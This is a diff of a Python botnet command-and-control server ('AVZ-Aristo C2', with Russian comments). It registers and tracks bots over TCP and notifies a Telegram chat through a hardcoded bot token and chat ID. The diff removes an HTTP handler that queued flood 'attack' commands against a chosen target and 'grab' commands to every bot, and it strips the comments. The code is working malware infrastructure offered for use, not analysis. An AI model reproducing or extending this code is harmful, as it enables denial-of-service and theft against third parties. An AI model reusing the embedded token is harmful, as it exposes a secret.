@@ -1,6 +1,5 @@
 cat > /root/c2/botnet/c2.py << 'EOF'
 #!/usr/bin/env python3
-# AVZ-Aristo C2 – минимальный, без тяжёлых зависимостей
 import asyncio, json, os, time
 from datetime import datetime
 from aiohttp import web
@@ -10,7 +9,6 @@ API_PORT = 8080
 BOTS_FILE = "bots.json"
 COMMANDS_FILE = "commands.json"
 
-# Телеграм (если не нужен, можно оставить пустым)
 TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
 TELEGRAM_CHAT_ID = "2119367196"
 
@@ -19,11 +17,8 @@ def telegram_notify(msg):
         return
     try:
         import requests
-        requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg},
-            timeout=5
-        )
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                      json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
     except:
         pass
 
@@ -99,7 +94,6 @@ async def handle_tcp(reader, writer):
             bots[ip]["status"] = "online"
             save_bots()
     else:
-        # Регистрация нового бота
         info = {}
         try:
             data = json.loads(msg)
@@ -137,44 +131,10 @@ async def start_tcp():
     async with server:
         await server.serve_forever()
 
-# HTTP API (оставлено для раздачи агентов и прочего)
-async def handle_list(request):
-    now = datetime.now()
-    bots_list = []
-    for bot_ip, bot in bots.items():
-        last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
-        bot["status"] = "online" if (now - last_seen).total_seconds() < 30 else "offline"
-        bots_list.append(bot)
-    return web.json_response(bots_list)
-
-async def handle_cmd(request):
-    data = await request.json()
-    cmd = data.get("cmd")
-    if cmd == "attack":
-        target = data["target"]
-        method = data.get("method", "GET")
-        threads = data.get("threads", 100)
-        bot_ips = data.get("bot_ips", list(bots.keys()))
-        for ip in bot_ips:
-            commands_queue.setdefault(ip, []).append(
-                {"type": "attack", "target": target, "method": method, "threads": threads})
-        save_commands()
-        return web.Response(text="commands queued")
-    elif cmd in ("grab", "stop"):
-        action = "grab" if cmd == "grab" else "stop"
-        bot_ips = data.get("bot_ips", list(bots.keys()))
-        for ip in bot_ips:
-            commands_queue.setdefault(ip, []).append({"type": action})
-        save_commands()
-        return web.Response(text=f"{action} queued")
-    return web.Response(text="unknown")
-
 async def main():
     tcp = asyncio.create_task(start_tcp())
     app = web.Application()
-    app.router.add_get('/list', handle_list)
-    app.router.add_post('/cmd', handle_cmd)
-    # Можно добавить раздачу агентов, но не обязательно для запуска
+    app.router.add_get('/list', lambda r: web.json_response(list(bots.values())))
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', API_PORT)
